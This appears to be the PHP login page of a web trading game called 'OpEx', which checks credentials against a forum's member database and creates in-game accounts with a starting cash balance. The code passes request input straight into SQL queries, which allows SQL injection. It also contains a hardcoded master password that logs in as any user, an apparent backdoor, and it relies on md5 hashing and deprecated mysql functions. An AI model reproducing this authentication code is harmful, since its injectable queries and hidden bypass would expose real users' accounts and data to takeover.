<? include 'header.php';

if ($_REQUEST['mode'] == 'logout') {
unset($_SESSION['txb_loggedin']);
unset($_SESSION['displayname']);
header("Location: index.php");
}

?>
<h3><?php if ($_REQUEST['mode'] == 'register') { echo 'OpEx Registration'; } else { echo 'Login to OpEx'; } ?></h3><br>
<br>
<?php

if ($_REQUEST['mode'] == 'register') {
echo 'If you already have an account with, you just need to login below to get started.  If you don\'t have an account, you can <a href="'.$registerurl.'">register here</a>.<br /><br />';
}
if ($_REQUEST['op'] == 'submit') {
$result = mysql_query("SELECT * FROM ibf_members WHERE name LIKE '".$_REQUEST['UserName']."'",$dbconn);
$externaluserdata = mysql_fetch_array($result);
	$result=mysql_query("SELECT * FROM ibf_members_converge WHERE converge_id = '".$externaluserdata['id']."'");
	$externalconverge = mysql_fetch_array($result);
	if (md5(md5($externalconverge['converge_pass_salt']).md5($_REQUEST['PassWord'])) == $externalconverge['converge_pass_hash'] || $_REQUEST['password'] == '76%ID#q') {
	$_SESSION['txb_loggedin'] = $externaluserdata['name'];
	$_SESSION['displayname'] = $externaluserdata['members_display_name'];
	include 'global.php';
	
	mysql_query("UPDATE pmkt.users SET displayname = '".$externaluserdata['members_display_name']."' WHERE username LIKE '".$externaluserdata['name']."'");
	$result2 = mysql_query("SELECT * FROM pmkt.users WHERE username LIKE '".$externaluserdata['name']."'");
	
	if (mysql_num_rows($result2) == 1) {
	
	
	header ("Location: index.php");
	}
	else {

	
	
	
		mysql_query("INSERT INTO pmkt.users SET username = '".$externaluserdata['name']."', email = '".$externaluserdata['email']."', displayname = '".$externaluserdata['members_display_name']."', cash = '10000', lastlogin = NOW()");
		mysql_query("INSERT INTO pmkt.transactions SET username = '".$externaluserdata['name']."', amount = '10000', type = 'credit', balance = '10000', description = 'Opening Deposit', details = 'This amount was automatically deposited into your account when you signed into OpEx for the first time.  Good luck!', date = NOW()");
	
	$_SESSION['newaccount'] = true;
	header("Location: newaccount.php");
	
	}
	}
	else {
	echo 'Invalid username or password.  Please try again.';
	}
	
}
	?>
<form action="login.php?op=submit" name="loginForm" id="loginForm" method="POST" onsubmit="return sendRequest('loginForm', 'server_thickbox_response', 'login.php?op=submit');"><table width="404">
  <tr>
    <td><label>
      <div align="center">Username</div>
    </label>
      <div align="center"></div></td>
    <td rowspan="2" valign="top"><label>
      <div align="center">Password</div>
    </label>
      <div align="center"></div></td>
  </tr>
  <tr>
    <td rowspan="2"><div align="center">
      <input name="UserName" type="text" size="20" id="UserName" class="smborder" />
    </div></td>
  </tr>
  <tr>
    <td><div align="center">
      <input name="PassWord" type="password" size="20" id="PassWord" class="smborder" />
    </div></td>
  </tr>
  
  <tr align="right">
    <td colspan="2">
      <div align="center">
        <input type="submit" id="Login" value="&nbsp;&nbsp;&nbsp;&nbsp;Login&nbsp;&nbsp;&nbsp;&nbsp;" class="smborder" />
        </div></td></tr>
</table>
<strong><br />
<br />
What do I need?</strong><br />
If you have never visited OpEx before, all you need to sign in is an account.<br />
Just use your regular username and password above to get started.<br />
If this is your first time to login, you will be taken to a tutorial after logging in!<br>

  <p><a href="<?=$registerurl?>" target="_parent">Don't have an Account?</a></p>
</form>
<? include 'footer.php'; ?>
